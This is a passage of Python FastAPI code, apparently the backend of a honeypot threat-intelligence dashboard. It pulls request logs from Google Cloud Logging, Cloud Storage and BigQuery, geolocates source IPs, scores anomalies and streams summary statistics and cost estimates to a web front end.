            arr = json.loads(stripped)
            if isinstance(arr, list):
                for item in arr:
                    rec = _obj_to_record(item, blob_updated, cutoff_dt)
                    if rec is not None:
                        out.append(rec)
                        if len(out) >= max_records:
                            return out
                return out
        except json.JSONDecodeError:
            pass

    for line in stripped.splitlines():
        line_s = line.strip()
        if not line_s:
            continue
        try:
            parsed = json.loads(line_s)
            rec = _obj_to_record(parsed, blob_updated, cutoff_dt)
        except json.JSONDecodeError:
            rec = _obj_to_record(line_s, blob_updated, cutoff_dt)
        if rec is not None:
            out.append(rec)
            if len(out) >= max_records:
                break

    return out


def _fetch_cloud_logging_entries_sync(cutoff_dt: datetime, limit: int) -> list[dict[str, Any]]:
    if limit <= 0 or not LOG_PROJECTS:
        return []

    cutoff_iso = cutoff_dt.strftime("%Y-%m-%dT%H:%M:%SZ")
    time_filter = f'timestamp >= "{cutoff_iso}"'
    full_filter = f"{time_filter} AND ({LOG_FILTER})" if LOG_FILTER else time_filter

    records: list[dict[str, Any]] = []
    per_project_limit = max(1, (limit + len(LOG_PROJECTS) - 1) // len(LOG_PROJECTS))
    page_size = min(max(per_project_limit, 100), 1000)

    for project_id in LOG_PROJECTS:
        if len(records) >= limit:
            break
        try:
            logging_client = gcp_logging.Client(project=project_id)
            entries = logging_client.list_entries(
                filter_=full_filter,
                order_by=gcp_logging.DESCENDING,
                page_size=page_size,
            )
            count_for_proj = 0
            for entry in entries:
                rec = _entry_to_record(entry, cutoff_dt)
                if rec is not None:
                    records.append(rec)
                    count_for_proj += 1
                    if count_for_proj >= per_project_limit or len(records) >= limit:
                        break
        except Exception as exc:
            logger.warning("Failed to fetch logs from Cloud Logging project %s: %s", project_id, exc)
            continue

    return records[:limit]


def _fetch_gcs_entries_sync(now_dt: datetime, cutoff_dt: datetime, limit: int) -> list[dict[str, Any]]:
    if limit <= 0 or not LOG_GCS_BUCKETS:
        return []

    storage_client = gcp_storage.Client(project=GCP_PROJECT_ID)
    records: list[dict[str, Any]] = []
    per_bucket_limit = max(1, (limit + len(LOG_GCS_BUCKETS) - 1) // len(LOG_GCS_BUCKETS))
    min_blob_time = cutoff_dt - timedelta(days=1)

    for bucket_name in LOG_GCS_BUCKETS:
        if len(records) >= limit:
            break
        try:
            bucket = storage_client.bucket(bucket_name)
            blobs = list(bucket.list_blobs(prefix=LOG_GCS_PREFIX or None))
        except Exception as exc:
            logger.warning("Failed to list GCS blobs in target %s: %s", bucket_name, exc)
            continue

        candidate_blobs = [
            b for b in blobs if (b.updated is None or b.updated >= min_blob_time)
        ]
        candidate_blobs.sort(
            key=lambda b: b.updated or datetime.min.replace(tzinfo=timezone.utc),
            reverse=True,
        )

        bucket_count = 0
        for blob in candidate_blobs[:MAX_GCS_BLOBS]:
            if bucket_count >= per_bucket_limit or len(records) >= limit:
                break
            if blob.size is not None and blob.size > MAX_GCS_BLOB_BYTES:
                logger.warning("Skipping oversized GCS blob %s/%s (%d bytes)", bucket_name, blob.name, blob.size)
                continue
            try:
                blob_updated = (
                    blob.updated
                    if blob.updated and blob.updated.tzinfo
                    else (blob.updated or now_dt).replace(tzinfo=timezone.utc)
                )
                text = blob.download_as_text(encoding="utf-8")
                rem = min(per_bucket_limit - bucket_count, limit - len(records))
                parsed_recs = _parse_blob_text_to_records(
                    text, blob_updated, cutoff_dt, max_records=rem
                )
                records.extend(parsed_recs)
                bucket_count += len(parsed_recs)
            except Exception as exc:
                logger.warning("Failed to read GCS blob %s/%s: %s", bucket_name, blob.name, exc)
                continue

    return records[:limit]


def _fetch_bigquery_entries_sync(cutoff_dt: datetime, limit: int) -> list[dict[str, Any]]:
    if not ENABLE_BIGQUERY_LOGS or limit <= 0 or not BQ_TABLE_ID:
        return []

    cutoff_iso = cutoff_dt.strftime("%Y-%m-%dT%H:%M:%SZ")
    safe_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    query = f"""
SELECT
  timestamp,
  jsonPayload,
  textPayload
FROM
  `{BQ_TABLE_ID}`
WHERE
  timestamp >= TIMESTAMP('{cutoff_iso}')
ORDER BY
  timestamp DESC
LIMIT {safe_limit}
"""

    records: list[dict[str, Any]] = []
    try:
        bq_client = gcp_bigquery.Client(project=BQ_PROJECT_ID)
        rows = bq_client.query(query).result()
        for row in rows:
            ts_dt = _parse_timestamp_str(getattr(row, "timestamp", None), datetime.now(timezone.utc))
            if ts_dt < cutoff_dt:
                continue

            jp = _parse_json_dict(getattr(row, "jsonPayload", None))
            tp = getattr(row, "textPayload", None)

            if jp:
                target_dict: dict[str, Any] = jp
            elif isinstance(tp, str) and tp.strip():
                target_dict = _parse_json_dict(tp) or {"event": "text", "message": tp.strip()}
            else:
                continue

            msg = target_dict.get("message")
            if isinstance(msg, str) and msg.strip().startswith("{"):
                nested_msg = _parse_json_dict(msg)
                if nested_msg:
                    merged = dict(nested_msg)
                    for k, v in target_dict.items():
                        if k != "message" and v is not None:
                            merged.setdefault(k, v)
                    target_dict = merged

            rec = _build_record_from_dict_and_meta(
                target_dict=target_dict,
                http_req={},
                ts_dt=ts_dt,
                fallback_ip="private",
                fallback_event=str(target_dict.get("event") or "request").lower(),
            )
            if rec is not None:
                records.append(rec)
                if len(records) >= limit:
                    break
    except Exception as exc:
        logger.warning("Failed to fetch logs from BigQuery %s: %s", BQ_TABLE_ID, exc)

    return records[:limit]


def _fetch_all_entries_sync(hours: int, limit: int) -> list[dict[str, Any]]:
    effective_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    now_dt = datetime.now(timezone.utc)
    cutoff_dt = now_dt - timedelta(hours=hours)
    combined: list[dict[str, Any]] = []

    if LOG_SOURCE_MODE in {"all", "both", "logging"}:
        combined.extend(
            _fetch_cloud_logging_entries_sync(
                cutoff_dt=cutoff_dt, limit=effective_limit
            )
        )

    if LOG_SOURCE_MODE in {"all", "both", "gcs"}:
        combined.extend(
            _fetch_gcs_entries_sync(
                now_dt=now_dt, cutoff_dt=cutoff_dt, limit=effective_limit
            )
        )

    if LOG_SOURCE_MODE in {"all", "bigquery"}:
        combined.extend(
            _fetch_bigquery_entries_sync(
                cutoff_dt=cutoff_dt, limit=effective_limit
            )
        )

    deduped: dict[str, dict[str, Any]] = {}
    for rec in combined:
        key = f"{rec['timestamp']}|{rec['ip']}|{rec['method']}|{rec['path']}|{rec['payload'][:120]}"
        if key not in deduped:
            deduped[key] = rec

    ordered = sorted(deduped.values(), key=lambda r: r["timestamp"], reverse=True)
    return ordered[:effective_limit]


async def fetch_logs_async(hours: int, limit: int) -> tuple[list[dict[str, Any]], bool]:
    try:
        records = await asyncio.to_thread(_fetch_all_entries_sync, hours, limit)
        return records, False
    except Exception as exc:
        logger.warning("Failed to fetch real logs: %s", exc)
        return [], False


def calculate_gcp_costs(log_count: int, total_bytes: int, hours: int) -> dict[str, Any]:
    scale_to_month = (24.0 * 30.0) / max(hours, 1)
    est_monthly_bytes = total_bytes * scale_to_month
    est_monthly_reqs = log_count * scale_to_month

    free_logging_bytes = 50 * (1024**3)
    billable_gib = max(0.0, (est_monthly_bytes - free_logging_bytes) / (1024**3))
    logging_usd = billable_gib * 0.50
    logging_quota_pct = min(100.0, round((est_monthly_bytes / free_logging_bytes) * 100.0, 2))

    free_run_reqs = 2_000_000
    billable_reqs = max(0.0, est_monthly_reqs - free_run_reqs)
    run_usd = (billable_reqs / 1_000_000) * 0.40
    run_quota_pct = min(100.0, round((est_monthly_reqs / free_run_reqs) * 100.0, 2))

    total_usd = round(logging_usd + run_usd, 4)
    total_jpy = round(total_usd * USD_TO_JPY, 1)

    return {
        "estimated_monthly_usd": total_usd,
        "estimated_monthly_jpy": total_jpy,
        "logging_free_tier_pct": logging_quota_pct,
        "cloud_run_free_tier_pct": run_quota_pct,
        "analyzed_bytes": total_bytes,
    }


async def build_stats_payload(hours: int, limit: int) -> dict[str, Any]:
    effective_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    cache_key = (
        hours,
        effective_limit,
        tuple(LOG_PROJECTS),
        tuple(LOG_GCS_BUCKETS),
        BQ_TABLE_ID,
        ENABLE_BIGQUERY_LOGS,
        LOG_SOURCE_MODE,
        LOG_FILTER,
        LOG_GCS_PREFIX,
        SKIP_JAPAN_IPS,
        SKIP_CRAWLERS,
        SKIP_GOOGLE_LLC,
        SKIP_PRIVATE_IPS,
        SKIP_SYSTEM_NOISE,
    )
    now_mono = time.monotonic()
    cached = LOG_RESPONSE_CACHE.get(cache_key)
    if cached is not None:
        cached_at, cached_payload = cached
        if (now_mono - cached_at) < LOG_CACHE_TTL:
            LOG_RESPONSE_CACHE.move_to_end(cache_key)
            return cached_payload

    raw_records, is_demo_mode = await fetch_logs_async(hours=hours, limit=effective_limit)
    ips = [r["ip"] for r in raw_records]
    geo_map = await resolve_geoip_batch(ips)

    category_counts: dict[str, int] = {}
    country_counts: dict[str, dict[str, Any]] = {}
    ip_counts: dict[str, dict[str, Any]] = {}
    timeline_events: list[dict[str, Any]] = []
    map_points_dict: dict[str, dict[str, Any]] = {}

    total_bytes = 0
    high_anomaly_count = 0

    for rec in raw_records:
        ip = rec["ip"]
        geo = _normalize_geo_entry(geo_map.get(ip), ip=ip)

        if SKIP_PRIVATE_IPS and _is_private_or_non_public_ip(ip, geo):
            continue
        if SKIP_GOOGLE_LLC and _is_google_llc(geo, rec.get("user_agent", ""), rec.get("payload", "")):
            continue
        if SKIP_JAPAN_IPS and _is_japan_geo(geo):
            continue

        total_bytes += rec["bytes"]
        display_country = sanitize_display_text(f"{geo['country_ja']} ({geo['country']})", max_len=160)

        category, confidence, anomaly_score = classify_and_score(
            event_type=rec.get("event_type", "request"),
            method=rec["method"],
            path=rec["path"],
            payload=rec["payload"],
            user_agent=rec["user_agent"],
            raw_request_line=rec.get("raw_request_line", ""),
            header_count=rec["header_count"],
        )
        if anomaly_score >= 75:
            high_anomaly_count += 1

        category_counts[category] = category_counts.get(category, 0) + 1

        c_key = f"{geo['flag']} {display_country}"
        if c_key not in country_counts:
            country_counts[c_key] = {
                "label": c_key,
                "flag": geo["flag"],
                "country": display_country,
                "country_ja": geo["country_ja"],
                "country_en": geo["country"],
                "country_code": geo["country_code"],
                "count": 0,
            }
        country_counts[c_key]["count"] += 1

        if ip not in ip_counts:
            ip_counts[ip] = {
                "ip": ip,
                "flag": geo["flag"],
                "country": display_country,
                "country_ja": geo["country_ja"],
                "country_en": geo["country"],
                "country_code": geo["country_code"],
                "isp": geo["isp"],
                "count": 0,
                "top_category": category,
            }
        ip_counts[ip]["count"] += 1

        if geo["lat"] != 0.0 or geo["lon"] != 0.0:
            if ip not in map_points_dict:
                map_points_dict[ip] = {
                    "ip": ip,
                    "lat": geo["lat"],
                    "lon": geo["lon"],
                    "flag": geo["flag"],
                    "country": display_country,
                    "country_ja": geo["country_ja"],
                    "country_en": geo["country"],
                    "country_code": geo["country_code"],
                    "isp": geo["isp"],
                    "count": 0,
                    "category": category,
                }
            map_points_dict[ip]["count"] += 1

        if len(timeline_events) < min(MAX_TIMELINE_EVENTS, effective_limit):
            safe_path = sanitize_display_text(rec["path"], max_len=500)
            safe_payload = sanitize_display_text(rec["payload"], max_len=1200)
            timeline_events.append(
                {
                    "id": sanitize_display_text(
                        f"{rec['timestamp']}_{ip}_{rec['method']}_{safe_path}",
                        max_len=600,
                    ),
                    "timestamp": rec["timestamp"],
                    "ip": ip,
                    "flag": geo["flag"],
                    "country": display_country,
                    "country_ja": geo["country_ja"],
                    "country_en": geo["country"],
                    "country_code": geo["country_code"],
                    "isp": geo["isp"],
                    "method": rec["method"],
                    "path": safe_path,
                    "payload": safe_payload,
                    "category": category,
                    "confidence": confidence,
                    "anomaly_score": anomaly_score,
                }
            )

    top_countries = sorted(country_counts.values(), key=lambda x: x["count"], reverse=True)[:10]
    top_ips = sorted(ip_counts.values(), key=lambda x: x["count"], reverse=True)[:10]
    cost_info = calculate_gcp_costs(len(timeline_events), total_bytes, hours)

    payload = {
        "updated_at": datetime.now(timezone.utc).isoformat(),
        "is_demo_mode": is_demo_mode,
        "summary": {
            "total_attacks": len(timeline_events),
            "unique_ips": len(ip_counts),
            "unique_countries": len(country_counts),
            "high_anomaly_count": high_anomaly_count,
        },
        "categories": category_counts,
        "top_countries": top_countries,
        "top_ips": top_ips,
        "map_points": list(map_points_dict.values()),
        "timeline": timeline_events,
        "cost": cost_info,
    }

    LOG_RESPONSE_CACHE[cache_key] = (time.monotonic(), payload)
    LOG_RESPONSE_CACHE.move_to_end(cache_key)
    while len(LOG_RESPONSE_CACHE) > MAX_LOG_CACHE_ENTRIES:
        LOG_RESPONSE_CACHE.popitem(last=False)
    return payload


@asynccontextmanager
async def lifespan(app: FastAPI):
    init_ml_models()
    yield


app = FastAPI(title="Honeypot Threat Intelligence Dashboard (Realtime)", lifespan=lifespan)

if ALLOWED_ORIGINS:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=ALLOWED_ORIGINS,
        allow_methods=["GET"],
        allow_headers=["Content-Type"],
    )


@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "DENY")
    response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
    return response


STATIC_ROOT = Path(__file__).resolve().parent / "static"
if STATIC_ROOT.is_dir():
    app.mount("/static", StaticFiles(directory=str(STATIC_ROOT)), name="static")


def _resolve_static_file(filename: str) -> Path:
    if not STATIC_ROOT.is_dir():
        raise HTTPException(status_code=404, detail="Static directory not found")
    candidate = (STATIC_ROOT / filename).resolve()
    if not candidate.is_relative_to(STATIC_ROOT.resolve()) or not candidate.is_file():
        raise HTTPException(status_code=404, detail="Not found")
    return candidate


@app.get("/")
async def serve_index() -> FileResponse:
    return FileResponse(_resolve_static_file("index.html"))


@app.get("/api/stats")
async def get_stats(
    hours: int = Query(default=24, ge=1, le=720),
    limit: int = Query(default=MAX_ALLOWED_LIMIT, ge=1, le=MAX_ALLOWED_LIMIT),
) -> dict[str, Any]:
    return await build_stats_payload(hours=hours, limit=limit)


@app.get("/api/stream")
async def stream_stats(
    request: Request,
    hours: int = Query(default=24, ge=1, le=720),
    limit: int = Query(default=MAX_ALLOWED_LIMIT, ge=1, le=MAX_ALLOWED_LIMIT),
) -> StreamingResponse:
    async def event_generator() -> AsyncGenerator[str, None]:
        while True:
            if await request.is_disconnected():
                break
            try:
                payload = await build_stats_payload(hours=hours, limit=limit)
                data_json = json.dumps(payload, ensure_ascii=False)
                yield f"event: stats\ndata: {data_json}\n\n"
            except Exception as exc:
                logger.warning("SSE stream generation error: %s", exc)
                err_json = json.dumps({"error": "Failed to build stream payload"}, ensure_ascii=False)
                yield f"event: error\ndata: {err_json}\n\n"

            await asyncio.sleep(STREAM_INTERVAL_SEC)

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@app.get("/environment")
@app.get("/environment.html")
async def serve_environment() -> FileResponse:
    return FileResponse(_resolve_static_file("environment.html"))